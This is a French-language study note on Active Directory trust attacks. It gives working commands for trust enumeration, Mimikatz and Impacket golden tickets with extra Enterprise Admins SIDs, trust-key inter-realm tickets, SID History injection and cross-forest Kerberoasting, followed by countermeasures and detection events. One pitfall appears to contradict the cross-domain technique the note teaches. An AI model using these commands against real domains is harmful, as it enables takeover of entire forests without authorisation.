---
title: "AD Trusts et Forêts — Attaques Cross-Domain"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Active Directory"
tags: [active-directory, trusts, forest, cross-domain, sid-history, golden-ticket, pentest, sécurité]
date: "2026-03-23"
prerequis: ["[[Kerberos Attacks]]"]
---

# AD Trusts et Forêts — Attaques Cross-Domain

Quand deux entreprises fusionnent, ou qu'un grand groupe sépare ses filiales en domaines distincts, il faut bien que les employés de l'un accèdent aux ressources de l'autre. Active Directory le permet par des **relations d'approbation** (*trusts*) : un domaine accepte de reconnaître les identités d'un autre. C'est pratique, mais c'est aussi un angle mort de sécurité. Un attaquant qui compromet un petit domaine mal protégé, une filiale, un ancien domaine de test, peut souvent remonter le long de ces relations jusqu'au domaine central, pourtant bien défendu. La frontière que l'on croyait étanche entre deux domaines ne l'est pas.

Les relations d'approbation entre domaines et forêts Active Directory permettent à des utilisateurs d'un domaine d'accéder aux ressources d'un autre. Elles créent des vecteurs d'escalade latérale qui permettent de passer d'un domaine compromis à un domaine parent, voire à une forêt entière.

> [!important] Idée clé
> Un trust n'est pas symétrique en confiance ni forcément transitif — compromettre un domaine enfant peu sécurisé peut suffire à remonter jusqu'au domaine parent via la clé de trust ou le SID History, même si le parent lui-même est bien protégé.

> [!abstract] Définition — Trust AD
> Relation d'approbation entre deux domaines ou forêts qui permet aux identités de l'un d'être reconnues dans l'autre. Un trust se caractérise par sa direction, sa transitivité et ses réglages de filtrage (SID Filtering, Selective Authentication), qui déterminent sa portée réelle. En pentest, il forme un chemin d'escalade depuis un domaine compromis vers son parent ou sa forêt.

## Concepts — Trusts AD

Un trust est une relation qui fait reconnaître les utilisateurs d'un domaine A dans un domaine B. Trois propriétés le définissent : sa **direction** (à sens unique ou dans les deux sens), sa **transitivité** (se propage-t-il aux domaines de proche en proche ?) et son **filtrage**, qui limite ce qu'il laisse réellement passer.

Plusieurs types coexistent. Les trusts **parent-enfant** et **tree-root** sont créés automatiquement à l'intérieur d'une forêt, bidirectionnels et transitifs ; c'est eux qui relient `enfant.domaine.local` à `domaine.local`, et ils partagent une clé de confiance avec le parent. Le **forest trust** relie manuellement deux forêts distinctes ; il est transitif à l'intérieur de chaque forêt et protégé par défaut par le filtrage de SID. L'**external trust** relie un domaine à un domaine hors de sa forêt ; il n'est pas transitif et, lui aussi, filtré par défaut.

La sécurité réelle d'un trust tient surtout à deux réglages. Le **filtrage de SID** (*SID Filtering*), quand il est désactivé, laisse passer les SID étrangers glissés dans un ticket Kerberos, ce qui rend exploitable l'abus de SID History et ouvre l'escalade vers le domaine de confiance ; activé, il les bloque. L'**authentification sélective** (*Selective Authentication*) va plus loin en n'autorisant que des utilisateurs explicitement désignés à accéder aux ressources de l'autre côté.

## Énumération des trusts

```powershell
# PowerShell natif
Get-ADTrust -Filter *
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# PowerView
Get-DomainTrust                               # Trusts du domaine courant
Get-DomainTrust -Domain child.domaine.local   # Trusts d'un domaine spécifique
Get-ForestTrust                               # Trusts au niveau forêt
Get-ForestDomain                              # Tous les domaines de la forêt

# Mapper tous les trusts de la forêt
Get-DomainTrustMapping   # Récursif — tous les domaines et leurs trusts

# BloodHound — visualiser les trusts
# Les edges "TrustedBy" et "Contains" représentent les relations de trust
```

```bash
# Impacket
python3 GetADUsers.py -all domaine.local/alice:Password123 -dc-ip 192.168.1.1

# Énumération des trusts via LDAP
python3 ldapsearch.py -u alice -p Password123 -d domaine.local \
    -l 192.168.1.1 "(objectClass=trustedDomain)"
```

## Exploitation — Child → Parent Domain

Si on compromet un domaine enfant, on peut escalader vers le domaine parent (même forêt).

```
Principe :
  1. Compromis du domaine enfant → obtenir le hash krbtgt de l'enfant
  2. Récupérer le SID du domaine parent et le "Enterprise Admins" group SID
  3. Forger un Golden Ticket avec le SID d'Enterprise Admins en Extra SID
  4. → Kerberos accepte le ticket car les deux domaines partagent la clé de trust
  5. → Accès en tant qu'Enterprise Admin sur le domaine parent

Prerequis :
  Hash krbtgt du domaine enfant (via DCSync sur l'enfant)
  SID du domaine enfant et du domaine parent
  SID du groupe Enterprise Admins (parent_SID-519)
```

```bash
# Récupérer les SID nécessaires
# Sur le domaine enfant
python3 secretsdump.py enfant.domaine.local/Administrator:Password@CHILD_DC -just-dc-user krbtgt

# Récupérer le SID du domaine parent
Get-DomainSID -Domain domaine.local   # PowerView
# Ou : python3 lookupsid.py enfant.domaine.local/Administrator:Password@CHILD_DC

# Forger le Golden Ticket avec ExtraSids (Enterprise Admins)
# Mimikatz
kerberos::golden \
    /user:Administrator \
    /domain:enfant.domaine.local \
    /sid:S-1-5-21-CHILD-DOMAIN-SID \
    /krbtgt:KRBTGT_CHILD_HASH \
    /sids:S-1-5-21-PARENT-DOMAIN-SID-519 \
    /ptt
# S-1-5-21-PARENT-SID-519 = Enterprise Admins

# Accéder au DC parent
dir \\parent-dc.domaine.local\C$
Invoke-Command -ComputerName parent-dc.domaine.local -ScriptBlock { whoami }

# Impacket — ticketer.py avec extra-sid
python3 ticketer.py \
    -nthash KRBTGT_CHILD_HASH \
    -domain-sid S-1-5-21-CHILD-SID \
    -domain enfant.domaine.local \
    -extra-sid S-1-5-21-PARENT-SID-519 \
    Administrator

export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass enfant.domaine.local/Administrator@parent-dc.domaine.local
```

## Exploitation — Trust Key (Inter-Domain)

Alternative au Golden Ticket : utiliser la clé de trust entre deux domaines.

```bash
# La clé de trust est un secret partagé entre deux domaines
# Elle est stockée dans l'objet "Trust" de chaque domaine

# Récupérer la clé de trust (nécessite DA sur le domaine source)
# Mimikatz
lsadump::trust /patch    # Dump les clés de trust
lsadump::dcsync /domain:enfant.domaine.local /user:enfant$  # Compte de trust inter-domaine

# Forger un Inter-Realm TGT avec la clé de trust
kerberos::golden \
    /user:Administrator \
    /domain:enfant.domaine.local \
    /sid:S-1-5-21-CHILD-SID \
    /rc4:TRUST_KEY_HASH \
    /service:krbtgt \
    /target:domaine.local \
    /sids:S-1-5-21-PARENT-SID-519 \
    /ptt

# Demander un TGS pour le DC parent avec ce ticket inter-realm
Rubeus.exe asktgs /ticket:TICKET_B64 /service:cifs/parent-dc.domaine.local /ptt
```

## SID History Abuse

```
SID History (sIDHistory) : attribut AD permettant à un compte d'hériter des SIDs d'anciens comptes
  → Utilisé légitimement lors de migrations de domaines
  → Si SID Filtering est désactivé → on peut injecter n'importe quel SID

Conditions d'exploitation :
  → Trust sans SID Filtering (netdom trust TARGET /FilterSids:No)
  → Ou trust intra-forêt (SID Filtering non appliqué par défaut entre domaines de même forêt)
```

```powershell
# Vérifier si SID Filtering est activé sur un trust
Get-DomainTrust | Select-Object TargetName, SidFilteringForestAware, SidFilteringQuarantined

# Ajouter un SID History à un compte (nécessite DA + désactivation temporaire de SID Filtering)
# Mimikatz — injecter un SID History
sid::patch
sid::add /sam:alice /new:S-1-5-21-PARENT-SID-519   # Injecter Enterprise Admins SID

# Vérifier le SID History du compte
Get-ADUser alice -Properties SIDHistory | Select-Object SIDHistory
```

## Forest Trust — Attaques Cross-Forest

```
Par défaut : SID Filtering EST activé pour les forest trusts
→ Impossible d'injecter des SID de l'autre forêt

EXCEPTION : si l'admin a désactivé SID Filtering sur le forest trust
→ Même exploitation que cross-domain → accès Enterprise Admins de l'autre forêt

Cas plus courant — exploitation légitime du forest trust :
  → Énumérer les ressources accessibles dans l'autre forêt
  → Kerberoasting sur les comptes de l'autre forêt (si trust bidirectionnel)
  → Trouver des comptes partagés / mêmes mots de passe
```

```bash
# Énumérer les ressources de l'autre forêt
# PowerView — si trust bidirectionnel
Get-DomainUser -Domain foret2.com              # Utilisateurs de l'autre forêt
Get-DomainGroup -Domain foret2.com             # Groupes
Get-DomainComputer -Domain foret2.com          # Machines

# Kerberoasting cross-forest (si trust permet l'accès LDAP)
python3 GetUserSPNs.py foret2.com/alice:Password123 -dc-ip FORET2_DC_IP -request

# Si Foreign Security Principals (FSP) configurés :
# Des comptes de la forêt 1 ont accès aux ressources de la forêt 2
Get-DomainForeignGroupMember -Domain foret2.com   # PowerView
# → Identifier les comptes de foret1 qui sont membres de groupes dans foret2
```

## Contre-mesures

L'**isolation des domaines** est le socle. Le filtrage de SID doit rester activé sur tous les trusts externes et de forêt (`netdom trust … /enablesidhistory:no /quarantine:yes`), car c'est lui qui bloque l'injection de SID d'un domaine à l'autre. L'authentification sélective durcit encore les forest trusts en n'ouvrant l'accès qu'aux comptes désignés. Enfin, il faut auditer régulièrement les trusts existants pour supprimer ceux qui ne servent plus, et préférer un trust à sens unique quand un trust bidirectionnel n'est pas justifié.

La **protection du compte krbtgt** limite la durée de vie des Golden Tickets inter-domaines : on en change le mot de passe deux fois de suite, régulièrement, et on surveille toute réplication de ses secrets (événement 4662 ciblant krbtgt). En parallèle, l'attribut **SID History** ne devrait servir qu'aux migrations, être nettoyé une fois celles-ci terminées, et toute modification inattendue de cet attribut doit déclencher une alerte.

Côté **détection**, on surveille les TGT porteurs de SID supplémentaires (événement 4768), les TGS avec des SID inter-domaines inattendus (4769) et les connexions à privilèges élevés venant d'un domaine externe (4672), ainsi que tout accès à des ressources sensibles depuis un domaine tiers.

## Pièges courants

> [!warning] Pièges courants
> - **Direction du trust ≠ direction de la confiance** : si `domain-A` "trusts" `domain-B`, les utilisateurs de `domain-B` peuvent accéder aux ressources de `domain-A` (et non l'inverse). La direction de la flèche dans `nltest` est l'inverse de l'intuition. Toujours vérifier avec `Get-DomainTrust` quel mode "Bidirectional" est clair.
> - **Forest Trust = transitif, External Trust = non** : un Forest Trust permet de naviguer toute la forêt distante. Un External Trust ne couvre QUE le domaine ciblé. Sortir d'un External Trust nécessite un nouveau trust.
> - **SID Filtering désactivé entre Parent/Child** : par défaut, dans une même forêt, le SID Filtering n'est pas appliqué entre parent et enfants. Compromettre un domaine enfant = injecter Enterprise Admin via SID History dans le parent.
> - **SID Filtering peut être désactivé sur External Trust** : `netdom trust /Quarantine:no` (souvent fait pour résoudre des problèmes legacy) ouvre la porte à SID History injection cross-forest.
> - **Selective Authentication** : sur un Forest Trust en Selective Auth, les users distants ne peuvent accéder QU'aux ressources où on leur a explicitement donné le droit "Allowed to Authenticate". Beaucoup moins permissif que Forest Trust standard.
> - **Domain Trust transitivity** : si A trusts B, et B trusts C, alors A ne trusts PAS forcément C. Sauf cas spécifiques (Forest Trust within forest = transitive, External = non-transitive).
> - **Compte krbtgt de chaque domaine** : compromis un krbtgt dans un domaine = Golden Ticket UNIQUEMENT pour ce domaine. Pas cross-domain. Pour pivoter, il faut le krbtgt de chaque cible.
> - **Trust account** : entre deux domaines, il existe un compte de service caché (`DOMAIN$`). Son hash crackable permet de forger des TGT inter-domaines. Vu rarement, mais possible avec DCSync sur les deux DCs.

> [!quiz] Comment un Golden Ticket forgé dans un domaine enfant donne-t-il les droits Enterprise Admin sur le parent ?
> Le ticket est signé avec le hash krbtgt de l'enfant et porte le SID du groupe Enterprise Admins du parent dans son champ ExtraSid. Les domaines d'une même forêt partagent la clé de trust et n'appliquent pas le SID Filtering entre parent et enfant : le KDC parent valide donc le ticket et accorde les privilèges du SID injecté.
